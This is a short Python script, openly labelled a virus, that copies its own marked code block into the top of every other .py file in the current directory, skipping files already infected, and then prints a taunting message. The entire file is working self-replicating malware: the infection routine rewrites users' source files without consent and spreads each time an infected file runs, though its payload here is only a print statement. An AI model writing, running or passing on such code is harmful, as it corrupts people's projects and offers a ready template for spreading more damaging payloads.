# VIRUS SAYS HI!

import glob

def get_virus_code():
    virus_code = []
    in_virus = False
    with open(__file__, 'r') as f:
        for line in f:
            if line.strip() == "# VIRUS SAYS HI!":
                in_virus = True
            if in_virus:
                virus_code.append(line)
            if line.strip() == "# VIRUS SAYS BYE!":
                break
    return virus_code

def infect_files(virus_code):
    python_files = glob.glob("*.py")
    for file in python_files:
        if file == "virus.py":
            continue
        with open(file, 'r') as f:
            content = f.readlines()
        infected = any("# VIRUS SAYS HI!" in line for line in content)
        if not infected:
            with open(file, 'w') as f:
                f.writelines(virus_code + ['\n'] + content)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

if __name__ == "__main__":
    virus_code = get_virus_code()
    infect_files(virus_code)
    malicious_code()

# VIRUS SAYS BYE!
